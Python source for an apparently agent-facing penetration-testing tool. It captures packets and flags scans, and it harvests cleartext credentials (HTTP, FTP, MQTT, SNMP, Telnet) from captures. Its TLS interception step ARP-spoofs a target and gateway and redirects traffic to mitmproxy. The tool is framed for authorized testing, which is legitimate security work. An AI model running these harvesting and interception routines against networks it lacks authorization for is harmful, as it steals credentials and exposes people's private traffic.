"""Traffic analysis tool — packet capture, session reconstruction, and credential harvesting.

Wraps tcpdump, tshark, tcpflow, and mitmproxy to provide:
  - pcap_capture:         Live packet capture with BPF filter support
  - pcap_parse:           Flow analysis, protocol breakdown, anomaly detection
  - session_reconstruct:  TCP stream reassembly + HTTP session extraction
  - cleartext_harvest:    Extract credentials from HTTP, FTP, Telnet, MQTT, SNMP
  - tls_intercept:        Transparent HTTPS interception via ARP spoof + mitmproxy

All actions target hosts and networks you own or have written authorization to test.
"""

from __future__ import annotations

import asyncio
import base64
import json
import logging
import re
import shlex
import time
from pathlib import Path
from typing import Any, Optional

from tools.parsers import ingest_output
from tools._tool_base import Tool

logger = logging.getLogger(__name__)

# Workspace root for captures
_WORKSPACE = Path("/tmp/protopen/traffic_analysis")


def _ts() -> str:
    return time.strftime("%Y%m%d_%H%M%S", time.gmtime())


def _safe(text: str) -> str:
    """Strip characters unsafe in path components."""
    return re.sub(r"[^A-Za-z0-9_.-]", "_", text)


class TrafficAnalysisTool(Tool):
    """Packet capture, session reconstruction, cleartext credential harvesting, and TLS interception."""

    def __init__(self, workspace: str = str(_WORKSPACE)):
        self._workspace = Path(workspace)
        self._workspace.mkdir(parents=True, exist_ok=True)
        self._target_store = None  # set by harness when available

    # ── Tool ABC ──────────────────────────────────────────────────────────────

    @property
    def name(self) -> str:
        return "traffic_analysis"

    @property
    def description(self) -> str:
        return (
            "Packet capture and traffic analysis for networks you own or have authorization to test. "
            "Actions: pcap_capture (live capture via tcpdump with BPF filter), "
            "pcap_parse (flow analysis + protocol breakdown via tshark), "
            "session_reconstruct (TCP stream reassembly + HTTP session extraction via tcpflow), "
            "cleartext_harvest (extract credentials from HTTP Basic, FTP, Telnet, MQTT, SNMP in a pcap), "
            "tls_intercept (transparent HTTPS interception via ARP spoof + mitmproxy — own devices only)."
        )

    @property
    def parameters(self) -> dict:
        return {
            "type": "object",
            "properties": {
                "action": {
                    "type": "string",
                    "description": "Action to perform",
                    "enum": [
                        "pcap_capture",
                        "pcap_parse",
                        "session_reconstruct",
                        "cleartext_harvest",
                        "tls_intercept",
                    ],
                },
                "interface": {
                    "type": "string",
                    "description": "Network interface to capture on (e.g. eth0, wlan0)",
                },
                "duration": {
                    "type": "integer",
                    "description": "Capture or intercept duration in seconds",
                },
                "filter": {
                    "type": "string",
                    "description": "BPF filter expression (e.g. 'host 192.168.1.100 and port 80')",
                },
                "pcap_file": {
                    "type": "string",
                    "description": "Path to an existing .pcap / .pcapng file to analyse",
                },
                "output_dir": {
                    "type": "string",
                    "description": "Directory to write session files (session_reconstruct)",
                },
                "analysis_type": {
                    "type": "string",
                    "description": "Analysis depth for pcap_parse: flows | protocols | suspicious | all (default: all)",
                    "enum": ["flows", "protocols", "suspicious", "all"],
                },
                "target_ip": {
                    "type": "string",
                    "description": "IP of the device to intercept (tls_intercept) — must be a device you own",
                },
                "gateway_ip": {
                    "type": "string",
                    "description": "IP of the default gateway (tls_intercept)",
                },
                "listen_port": {
                    "type": "integer",
                    "description": "mitmproxy listening port (default: 8080)",
                },
                "packet_count": {
                    "type": "integer",
                    "description": "Stop capture after this many packets (pcap_capture, 0 = unlimited)",
                },
            },
            "required": ["action"],
        }

    # ── Dispatcher ────────────────────────────────────────────────────────────

    async def execute(self, **kwargs: Any) -> str:
        action = kwargs.get("action", "")
        dispatch = {
            "pcap_capture": lambda: self._pcap_capture(
                interface=kwargs.get("interface", "eth0"),
                duration=int(kwargs.get("duration", 60)),
                bpf_filter=kwargs.get("filter", ""),
                packet_count=int(kwargs.get("packet_count", 0)),
            ),
            "pcap_parse": lambda: self._pcap_parse(
                pcap_file=kwargs.get("pcap_file", ""),
                analysis_type=kwargs.get("analysis_type", "all"),
            ),
            "session_reconstruct": lambda: self._session_reconstruct(
                pcap_file=kwargs.get("pcap_file", ""),
                output_dir=kwargs.get("output_dir", ""),
            ),
            "cleartext_harvest": lambda: self._cleartext_harvest(
                pcap_file=kwargs.get("pcap_file", ""),
            ),
            "tls_intercept": lambda: self._tls_intercept(
                interface=kwargs.get("interface", "eth0"),
                target_ip=kwargs.get("target_ip", ""),
                gateway_ip=kwargs.get("gateway_ip", ""),
                listen_port=int(kwargs.get("listen_port", 8080)),
                duration=int(kwargs.get("duration", 120)),
            ),
        }
        fn = dispatch.get(action)
        if fn is None:
            return f"Unknown action: {action}. Available: {list(dispatch.keys())}"
        try:
            result = await fn()
            ingest_output("traffic_analysis", action, result, getattr(self, "_target_store", None))
            return result
        except Exception as exc:
            logger.exception("TrafficAnalysisTool error (%s)", action)
            return json.dumps({"error": str(exc), "action": action})

    # ── Subprocess helpers ────────────────────────────────────────────────────

    async def _run(self, *args: str, timeout: int = 120, allow_nonzero: bool = False) -> tuple[str, str, int]:
        """Run command; return (stdout, stderr, returncode)."""
        logger.info("Running: %s", " ".join(args))
        proc = await asyncio.create_subprocess_exec(
            *args,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except asyncio.TimeoutError:
            proc.kill()
            await proc.wait()
            raise RuntimeError(f"Command timed out after {timeout}s: {' '.join(args)}")
        out = stdout.decode(errors="replace").strip()
        err = stderr.decode(errors="replace").strip()
        if proc.returncode != 0 and not allow_nonzero:
            raise RuntimeError(f"Command exited {proc.returncode}: {' '.join(args)}\n{err or out}")
        return out, err, proc.returncode or 0

    async def _run_bg(self, *args: str) -> asyncio.subprocess.Process:
        logger.info("Starting background: %s", " ".join(args))
        return await asyncio.create_subprocess_exec(
            *args,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )

    async def _kill(self, proc: asyncio.subprocess.Process) -> None:
        try:
            proc.terminate()
            await asyncio.wait_for(proc.wait(), timeout=5)
        except Exception:
            try:
                proc.kill()
            except Exception:
                pass

    # ── pcap_capture ─────────────────────────────────────────────────────────

    async def _pcap_capture(
        self,
        interface: str,
        duration: int,
        bpf_filter: str,
        packet_count: int,
    ) -> str:
        """Capture live traffic to a pcap file."""
        cap_dir = self._workspace / f"capture_{_ts()}"
        cap_dir.mkdir(parents=True, exist_ok=True)
        pcap_path = cap_dir / "capture.pcap"

        cmd = ["tcpdump", "-i", interface, "-w", str(pcap_path), "-n"]
        if packet_count > 0:
            cmd += ["-c", str(packet_count)]
        if bpf_filter:
            # BPF filter args passed as additional positional args to tcpdump;
            # use shlex.split to preserve quoted tokens in complex expressions.
            cmd += shlex.split(bpf_filter)

        if packet_count > 0:
            # tcpdump exits on its own after packet_count packets
            out, err, rc = await self._run(*cmd, timeout=duration + 30, allow_nonzero=True)
        else:
            # Time-bounded capture: run in background, sleep, then terminate
            proc = await self._run_bg(*cmd)
            await asyncio.sleep(duration)
            await self._kill(proc)
            out, err, rc = "", "", 0

        # Count captured packets via tshark if available, else estimate
        packet_count_actual = await self._count_packets(str(pcap_path))

        return json.dumps(
            {
                "action": "pcap_capture",
                "pcap_file": str(pcap_path),
                "interface": interface,
                "duration_seconds": duration,
                "bpf_filter": bpf_filter,
                "packet_count": packet_count_actual,
                "capture_dir": str(cap_dir),
            }
        )

    async def _count_packets(self, pcap_path: str) -> int:
        try:
            out, _, _ = await self._run(
                "tshark",
                "-r",
                pcap_path,
                "-T",
                "fields",
                "-e",
                "frame.number",
                timeout=30,
                allow_nonzero=True,
            )
            lines = [l for l in out.splitlines() if l.strip().isdigit()]
            return int(lines[-1]) if lines else 0
        except Exception:
            return 0

    # ── pcap_parse ───────────────────────────────────────────────────────────

    async def _pcap_parse(self, pcap_file: str, analysis_type: str) -> str:
        """Analyse a pcap file: flows, protocols, suspicious activity."""
        if not pcap_file:
            return json.dumps({"error": "pcap_file is required"})
        if not Path(pcap_file).exists():
            return json.dumps({"error": f"File not found: {pcap_file}"})

        results: dict = {"action": "pcap_parse", "pcap_file": pcap_file, "analysis_type": analysis_type}

        tasks = []
        if analysis_type in ("flows", "all"):
            tasks.append(("flows", self._extract_flows(pcap_file)))
        if analysis_type in ("protocols", "all"):
            tasks.append(("protocols", self._extract_protocols(pcap_file)))
        if analysis_type in ("suspicious", "all"):
            tasks.append(("suspicious", self._extract_suspicious(pcap_file)))

        for key, coro in tasks:
            try:
                results[key] = await coro
            except Exception as exc:
                results[key] = {"error": str(exc)}

        return json.dumps(results)

    async def _extract_flows(self, pcap_file: str) -> dict:
        """Extract top conversation flows (src_ip:port → dst_ip:port, bytes, packets)."""
        out, _, _ = await self._run(
            "tshark",
            "-r",
            pcap_file,
            "-q",
            "-z",
            "conv,tcp",
            timeout=60,
            allow_nonzero=True,
        )
        flows = _parse_tshark_conv(out)
        # Also get UDP flows
        out_udp, _, _ = await self._run(
            "tshark",
            "-r",
            pcap_file,
            "-q",
            "-z",
            "conv,udp",
            timeout=60,
            allow_nonzero=True,
        )
        flows_udp = _parse_tshark_conv(out_udp)
        return {"tcp": flows[:50], "udp": flows_udp[:50]}

    async def _extract_protocols(self, pcap_file: str) -> dict:
        """Get protocol hierarchy breakdown."""
        out, _, _ = await self._run(
            "tshark",
            "-r",
            pcap_file,
            "-q",
            "-z",
            "io,phs",
            timeout=60,
            allow_nonzero=True,
        )
        return {"hierarchy": out[:4000]}

    async def _extract_suspicious(self, pcap_file: str) -> dict:
        """Detect suspicious patterns: port scans, unusual protocols, large transfers."""
        findings: list[dict] = []

        # Detect SYN scans: many SYN to different ports from same src
        out, _, _ = await self._run(
            "tshark",
            "-r",
            pcap_file,
            "-Y",
            "tcp.flags.syn==1 and tcp.flags.ack==0",
            "-T",
            "fields",
            "-e",
            "ip.src",
            "-e",
            "ip.dst",
            "-e",
            "tcp.dstport",
            "-E",
            "separator=,",
            timeout=60,
            allow_nonzero=True,
        )
        syn_data = _aggregate_syn_scan(out)
        if syn_data["scanners"]:
            findings.append({"type": "syn_scan", "detail": syn_data})

        # Detect cleartext auth protocols on non-standard ports or any FTP/Telnet
        out2, _, _ = await self._run(
            "tshark",
            "-r",
            pcap_file,
            "-Y",
            "ftp or telnet or http.authorization",
            "-T",
            "fields",
            "-e",
            "ip.src",
            "-e",
            "ip.dst",
            "-e",
            "frame.protocols",
            "-E",
            "separator=,",
            timeout=60,
            allow_nonzero=True,
        )
        if out2.strip():
            sample = [l for l in out2.splitlines() if l.strip()][:20]
            findings.append({"type": "cleartext_auth_protocols", "samples": sample})

        # Detect DNS tunneling: unusually long queries
        out3, _, _ = await self._run(
            "tshark",
            "-r",
            pcap_file,
            "-Y",
            "dns",
            "-T",
            "fields",
            "-e",
            "dns.qry.name",
            timeout=60,
            allow_nonzero=True,
        )
        long_dns = [q for q in out3.splitlines() if q and len(q) > 50]
        if long_dns:
            findings.append({"type": "long_dns_queries", "count": len(long_dns), "samples": long_dns[:10]})

        # Detect non-encrypted traffic on port 443 (SSL strip or misconfiguration)
        out4, _, _ = await self._run(
            "tshark",
            "-r",
            pcap_file,
            "-Y",
            "tcp.port==443 and not ssl and not tls",
            "-T",
            "fields",
            "-e",
            "ip.src",
            "-e",
            "ip.dst",
            "-E",
            "separator=,",
            timeout=60,
            allow_nonzero=True,
        )
        if out4.strip():
            sample = [l for l in out4.splitlines() if l.strip()][:10]
            findings.append({"type": "plaintext_on_443", "samples": sample})

        return {"findings": findings, "finding_count": len(findings)}

    # ── session_reconstruct ──────────────────────────────────────────────────

    async def _session_reconstruct(self, pcap_file: str, output_dir: str) -> str:
        """Reconstruct TCP streams and extract HTTP sessions via tcpflow."""
        if not pcap_file:
            return json.dumps({"error": "pcap_file is required"})
        if not Path(pcap_file).exists():
            return json.dumps({"error": f"File not found: {pcap_file}"})

        if not output_dir:
            output_dir = str(self._workspace / f"sessions_{_ts()}")
        Path(output_dir).mkdir(parents=True, exist_ok=True)

        out, err, rc = await self._run(
            "tcpflow",
            "-r",
            pcap_file,
            "-o",
            output_dir,
            "-a",  # output all TCP streams including partial
            "-e",
            "http",  # enable http decoder
            timeout=120,
            allow_nonzero=True,
        )

        # Parse reconstructed files
        sessions = []
        out_path = Path(output_dir)
        for f in sorted(out_path.iterdir()):
            if not f.is_file() or f.suffix in (".md", ".xml"):
                continue
            try:
                content = f.read_bytes()[:8192]  # first 8KB
                text = content.decode(errors="replace")
                session = _parse_http_stream(f.name, text)
                if session:
                    sessions.append(session)
            except Exception:
                continue

        # Also look for tcpflow's report.xml if present
        xml_summary = ""
        xml_path = out_path / "report.xml"
        if xml_path.exists():
            xml_summary = xml_path.read_text(errors="replace")[:2000]

        return json.dumps(
            {
                "action": "session_reconstruct",
                "pcap_file": pcap_file,
                "output_dir": output_dir,
                "stream_count": len(list(out_path.iterdir())),
                "http_sessions": sessions[:50],
                "tcpflow_stderr": err[:500],
                "xml_summary": xml_summary,
            }
        )

    # ── cleartext_harvest ────────────────────────────────────────────────────

    async def _cleartext_harvest(self, pcap_file: str) -> str:
        """Extract cleartext credentials from a pcap file."""
        if not pcap_file:
            return json.dumps({"error": "pcap_file is required"})
        if not Path(pcap_file).exists():
            return json.dumps({"error": f"File not found: {pcap_file}"})

        findings: list[dict] = []

        # HTTP Basic Auth
        http_creds = await self._harvest_http_basic(pcap_file)
        findings.extend(http_creds)

        # HTTP POST bodies (form logins)
        http_forms = await self._harvest_http_forms(pcap_file)
        findings.extend(http_forms)

        # FTP credentials
        ftp_creds = await self._harvest_ftp(pcap_file)
        findings.extend(ftp_creds)

        # Telnet data streams
        telnet_data = await self._harvest_telnet(pcap_file)
        findings.extend(telnet_data)

        # MQTT credentials
        mqtt_creds = await self._harvest_mqtt(pcap_file)
        findings.extend(mqtt_creds)

        # SNMP community strings
        snmp_creds = await self._harvest_snmp(pcap_file)
        findings.extend(snmp_creds)

        return json.dumps(
            {
                "action": "cleartext_harvest",
                "pcap_file": pcap_file,
                "credential_count": len(findings),
                "findings": findings,
            }
        )

    async def _harvest_http_basic(self, pcap_file: str) -> list[dict]:
        """Extract HTTP Basic auth headers."""
        out, _, _ = await self._run(
            "tshark",
            "-r",
            pcap_file,
            "-Y",
            "http.authorization",
            "-T",
            "fields",
            "-e",
            "ip.src",
            "-e",
            "ip.dst",
            "-e",
            "http.host",
            "-e",
            "http.authorization",
            "-E",
            "separator=|",
            timeout=60,
            allow_nonzero=True,
        )
        results = []
        for line in out.splitlines():
            parts = line.split("|")
            if len(parts) < 4:
                continue
            src, dst, host, auth = parts[0], parts[1], parts[2], parts[3]
            if auth.lower().startswith("basic "):
                try:
                    decoded = base64.b64decode(auth[6:].strip()).decode(errors="replace")
                    results.append(
                        {
                            "protocol": "HTTP Basic Auth",
                            "src_ip": src,
                            "dst_ip": dst,
                            "host": host,
                            "credentials": decoded,
                        }
                    )
                except Exception:
                    results.append(
                        {
                            "protocol": "HTTP Basic Auth",
                            "src_ip": src,
                            "dst_ip": dst,
                            "host": host,
                            "credentials_raw": auth,
                        }
                    )
        return results

    async def _harvest_http_forms(self, pcap_file: str) -> list[dict]:
        """Extract HTTP POST form data that may contain credentials."""
        out, _, _ = await self._run(
            "tshark",
            "-r",
            pcap_file,
            "-Y",
            "http.request.method==POST",
            "-T",
            "fields",
            "-e",
            "ip.src",
            "-e",
            "ip.dst",
            "-e",
            "http.host",
            "-e",
            "http.request.uri",
            "-e",
            "urlencoded-form",
            "-E",
            "separator=|",
            timeout=60,
            allow_nonzero=True,
        )
        results = []
        cred_keywords = re.compile(
            r"(password|passwd|pass|pwd|secret|token|key|credential|auth)[=:]([^&\s]{1,128})",
            re.IGNORECASE,
        )
        for line in out.splitlines():
            parts = line.split("|")
            if len(parts) < 5:
                continue
            src, dst, host, uri, form = parts[0], parts[1], parts[2], parts[3], parts[4]
            m = cred_keywords.search(form)
            if m:
                results.append(
                    {
                        "protocol": "HTTP POST Form",
                        "src_ip": src,
                        "dst_ip": dst,
                        "host": host,
                        "uri": uri,
                        "field": m.group(1),
                        "value": m.group(2),
                    }
                )
        return results

    async def _harvest_ftp(self, pcap_file: str) -> list[dict]:
        """Extract FTP USER and PASS commands."""
        out, _, _ = await self._run(
            "tshark",
            "-r",
            pcap_file,
            "-Y",
            "ftp.request.command==USER or ftp.request.command==PASS",
            "-T",
            "fields",
            "-e",
            "ip.src",
            "-e",
            "ip.dst",
            "-e",
            "ftp.request.command",
            "-e",
            "ftp.request.arg",
            "-E",
            "separator=|",
            timeout=60,
            allow_nonzero=True,
        )
        results = []
        # Keyed by (src, dst) to correctly attribute PASS to the most recent USER
        # for that session, even when multiple sessions interleave.
        pending: dict[tuple[str, str], dict] = {}
        for line in out.splitlines():
            parts = line.split("|")
            if len(parts) < 4:
                continue
            src, dst, cmd, arg = parts[0], parts[1], parts[2].strip().upper(), parts[3]
            if cmd == "USER":
                pending[(src, dst)] = {
                    "protocol": "FTP",
                    "src_ip": src,
                    "dst_ip": dst,
                    "username": arg,
                    "password": None,
                }
            elif cmd == "PASS" and (src, dst) in pending:
                entry = pending.pop((src, dst))
                entry["password"] = arg
                results.append(entry)
        return results

    async def _harvest_telnet(self, pcap_file: str) -> list[dict]:
        """Extract Telnet data stream content."""
        out, _, _ = await self._run(
            "tshark",
            "-r",
            pcap_file,
            "-Y",
            "telnet",
            "-T",
            "fields",
            "-e",
            "ip.src",
            "-e",
            "ip.dst",
            "-e",
            "telnet.data",
            "-E",
            "separator=|",
            timeout=60,
            allow_nonzero=True,
        )
        results = []
        # Group data by src/dst pair
        streams: dict[tuple, list[str]] = {}
        for line in out.splitlines():
            parts = line.split("|")
            if len(parts) < 3:
                continue
            key = (parts[0], parts[1])
            streams.setdefault(key, []).append(parts[2])
        for (src, dst), data_chunks in streams.items():
            combined = "".join(data_chunks)
            results.append(
                {
                    "protocol": "Telnet",
                    "src_ip": src,
                    "dst_ip": dst,
                    "data_sample": combined[:512],
                    "total_chars": len(combined),
                }
            )
        return results

    async def _harvest_mqtt(self, pcap_file: str) -> list[dict]:
        """Extract MQTT CONNECT credentials."""
        out, _, _ = await self._run(
            "tshark",
            "-r",
            pcap_file,
            "-Y",
            "mqtt.msgtype==1",  # CONNECT message type
            "-T",
            "fields",
            "-e",
            "ip.src",
            "-e",
            "ip.dst",
            "-e",
            "mqtt.username",
            "-e",
            "mqtt.passwd",
            "-E",
            "separator=|",
            timeout=60,
            allow_nonzero=True,
        )
        results = []
        for line in out.splitlines():
            parts = line.split("|")
            if len(parts) < 4:
                continue
            src, dst, user, passwd = parts[0], parts[1], parts[2], parts[3]
            if user or passwd:
                results.append(
                    {
                        "protocol": "MQTT",
                        "src_ip": src,
                        "dst_ip": dst,
                        "username": user,
                        "password": passwd,
                    }
                )
        return results

    async def _harvest_snmp(self, pcap_file: str) -> list[dict]:
        """Extract SNMP v1/v2c community strings."""
        out, _, _ = await self._run(
            "tshark",
            "-r",
            pcap_file,
            "-Y",
            "snmp",
            "-T",
            "fields",
            "-e",
            "ip.src",
            "-e",
            "ip.dst",
            "-e",
            "snmp.community",
            "-E",
            "separator=|",
            timeout=60,
            allow_nonzero=True,
        )
        results = []
        seen: set[tuple] = set()
        for line in out.splitlines():
            parts = line.split("|")
            if len(parts) < 3:
                continue
            src, dst, community = parts[0], parts[1], parts[2]
            if not community or (src, dst, community) in seen:
                continue
            seen.add((src, dst, community))
            results.append(
                {
                    "protocol": "SNMP",
                    "src_ip": src,
                    "dst_ip": dst,
                    "community_string": community,
                }
            )
        return results

    # ── tls_intercept ────────────────────────────────────────────────────────

    async def _tls_intercept(
        self,
        interface: str,
        target_ip: str,
        gateway_ip: str,
        listen_port: int,
        duration: int,
    ) -> str:
        """Transparent TLS interception using ARP spoofing + mitmproxy.

        Prerequisites:
          - arpspoof (dsniff package) — or arping/arpwatch
          - mitmproxy
          - iptables
          - IP forwarding enabled on the host

        This targets a device you own. ARP spoofing without authorization is
        illegal — this tool is gated by the engagement system.
        """
        if not target_ip:
            return json.dumps({"error": "target_ip is required"})
        if not gateway_ip:
            return json.dumps({"error": "gateway_ip is required"})

        cap_dir = self._workspace / f"tls_intercept_{_ts()}"
        cap_dir.mkdir(parents=True, exist_ok=True)
        flow_dump = cap_dir / "flows.dump"
        flow_json = cap_dir / "flows.json"
        setup_log: list[str] = []

        procs: list[asyncio.subprocess.Process] = []
        orig_ip_forward = "0"
        iptables_added = False

        try:
            # 1. Save original IP forwarding state then enable
            orig_out, _, _ = await self._run(
                "sysctl",
                "-n",
                "net.ipv4.ip_forward",
                timeout=5,
                allow_nonzero=True,
            )
            orig_ip_forward = orig_out.strip() or "0"
            out, _, _ = await self._run(
                "sysctl",
                "-w",
                "net.ipv4.ip_forward=1",
                timeout=10,
                allow_nonzero=True,
            )
            setup_log.append(f"ip_forward: {out} (was {orig_ip_forward})")

            # 2. iptables REDIRECT rule: intercept port 443 → mitmproxy
            await self._run(
                "iptables",
                "-t",
                "nat",
                "-A",
                "PREROUTING",
                "-i",
                interface,
                "-p",
                "tcp",
                "--dport",
                "443",
                "-j",
                "REDIRECT",
                "--to-port",
                str(listen_port),
                timeout=10,
            )
            iptables_added = True
            setup_log.append(f"iptables redirect 443 → {listen_port} added")

            # 3. ARP spoof both directions (target ↔ gateway)
            arp_t2g = await self._run_bg(
                "arpspoof",
                "-i",
                interface,
                "-t",
                target_ip,
                gateway_ip,
            )
            procs.append(arp_t2g)
            setup_log.append(f"arpspoof target_ip={target_ip} → gateway_ip={gateway_ip} started")

            arp_g2t = await self._run_bg(
                "arpspoof",
                "-i",
                interface,
                "-t",
                gateway_ip,
                target_ip,
            )
            procs.append(arp_g2t)
            setup_log.append(f"arpspoof gateway_ip={gateway_ip} → target_ip={target_ip} started")

            # 4. Start mitmproxy in transparent mode, write flow dump
            mitm_proc = await self._run_bg(
                "mitmdump",
                "--mode",
                "transparent",
                "--listen-port",
                str(listen_port),
                "-w",
                str(flow_dump),
                "--ssl-insecure",
            )
            procs.append(mitm_proc)
            setup_log.append(f"mitmdump started on port {listen_port}, writing to {flow_dump}")

            # 5. Wait for the intercept duration
            await asyncio.sleep(duration)

        finally:
            # Tear down — kill all background processes
            for p in procs:
                await self._kill(p)

            # Remove iptables rule (best-effort)
            try:
                await self._run(
                    "iptables",
                    "-t",
                    "nat",
                    "-D",
                    "PREROUTING",
                    "-i",
                    interface,
                    "-p",
                    "tcp",
                    "--dport",
                    "443",
                    "-j",
                    "REDIRECT",
                    "--to-port",
                    str(listen_port),
                    timeout=10,
                    allow_nonzero=True,
                )
                setup_log.append("iptables redirect rule removed")
            except Exception as e:
                setup_log.append(f"iptables cleanup warning: {e}")

            # Restore original IP forwarding state
            if orig_ip_forward == "0":
                try:
                    await self._run(
                        "sysctl",
                        "-w",
                        "net.ipv4.ip_forward=0",
                        timeout=10,
                        allow_nonzero=True,
                    )
                    setup_log.append("ip_forward restored to 0")
                except Exception as e:
                    setup_log.append(f"ip_forward restore warning: {e}")

            # Restore ARP tables (restore is automatic when arpspoof exits,
            # but send gratuitous ARPs to speed recovery)
            try:
                await self._run(
                    "arping",
                    "-c",
                    "3",
                    "-I",
                    interface,
                    target_ip,
                    timeout=10,
                    allow_nonzero=True,
                )
            except Exception:
                pass

        # Convert mitmproxy dump to JSON if the dump file exists
        flows_extracted: list[dict] = []
        if flow_dump.exists():
            try:
                out2, _, _ = await self._run(
                    "mitmdump",
                    "-r",
                    str(flow_dump),
                    "-w",
                    "-",
                    timeout=30,
                    allow_nonzero=True,
                )
                # mitmdump -w - writes binary; use mitmproxy's python API alternatively.
                # For now, store raw dump path and report size.
                pass
            except Exception:
                pass

            # Use tshark to parse the dump as pcap-like if it's a PCAP (mitmdump supports -w pcap)
            # More portable: parse with custom reader below
            flows_extracted = _parse_mitm_dump_text(flow_dump)

        return json.dumps(
            {
                "action": "tls_intercept",
                "target_ip": target_ip,
                "gateway_ip": gateway_ip,
                "interface": interface,
                "listen_port": listen_port,
                "duration_seconds": duration,
                "capture_dir": str(cap_dir),
                "flow_dump": str(flow_dump),
                "setup_log": setup_log,
                "flows_extracted": len(flows_extracted),
                "flows": flows_extracted[:50],
            }
        )


# ── Parser helpers (module-level, reused by parser module) ───────────────────


def _parse_tshark_conv(raw: str) -> list[dict]:
    """Parse tshark -z conv,tcp/udp output into structured flow dicts."""
    flows = []
    # Header line format: <A addr>:<port> <-> <B addr>:<port> | frames | bytes | ...
    pattern = re.compile(r"([\d.]+):(\d+)\s+<->\s+([\d.]+):(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)")
    for line in raw.splitlines():
        m = pattern.search(line)
        if m:
            flows.append(
                {
                    "src": m.group(1),
                    "src_port": int(m.group(2)),
                    "dst": m.group(3),
                    "dst_port": int(m.group(4)),
                    "frames_ab": int(m.group(5)),
                    "bytes_ab": int(m.group(6)),
                    "frames_ba": int(m.group(7)),
                    "bytes_ba": int(m.group(8)),
                }
            )
    return flows


def _aggregate_syn_scan(raw: str) -> dict:
    """Count SYN packets per src→dst to detect port scans."""
    from collections import defaultdict

    src_ports: dict[str, set] = defaultdict(set)
    for line in raw.splitlines():
        parts = line.split(",")
        if len(parts) >= 3:
            src, dst, port = parts[0].strip(), parts[1].strip(), parts[2].strip()
            if port.isdigit():
                src_ports[f"{src}→{dst}"].add(int(port))
    scanners = {k: sorted(v) for k, v in src_ports.items() if len(v) >= 20}
    return {"scanners": scanners, "total_syn_senders": len(src_ports)}


def _parse_http_stream(filename: str, content: str) -> Optional[dict]:
    """Extract method, URI, Host, and any credentials from a tcpflow stream file."""
    lines = content.splitlines()
    if not lines:
        return None

    first_line = lines[0].strip()
    http_req_re = re.compile(r"^(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS) (\S+) HTTP/")
    m = http_req_re.match(first_line)
    if not m:
        return None  # Not an HTTP request stream

    session: dict = {
        "filename": filename,
        "method": m.group(1),
        "uri": m.group(2),
        "host": "",
        "authorization": "",
        "content_type": "",
        "body_preview": "",
    }

    in_body = False
    body_lines: list[str] = []
    for line in lines[1:]:
        if not in_body:
            if line == "":
                in_body = True
            elif ":" in line:
                k, _, v = line.partition(":")
                k = k.strip().lower()
                v = v.strip()
                if k == "host":
                    session["host"] = v
                elif k == "authorization":
                    session["authorization"] = v
                elif k == "content-type":
                    session["content_type"] = v
        else:
            body_lines.append(line)
            if len(body_lines) >= 5:
                break

    session["body_preview"] = "\n".join(body_lines)[:512]
    return session


def _parse_mitm_dump_text(dump_path: Path) -> list[dict]:
    """Best-effort text scan of a mitmproxy dump file for flow metadata."""
    # mitmproxy dump files are binary (protobuf-like); try UTF-8 string extraction
    flows = []
    try:
        data = dump_path.read_bytes()
        text = data.decode(errors="replace")
        # Look for URLs
        url_re = re.compile(r"https?://[^\x00-\x1f\x7f-\x9f\s]{5,200}")
        urls = list(set(url_re.findall(text)))[:100]
        for url in urls:
            flows.append({"url": url})
    except Exception:
        pass
    return flows
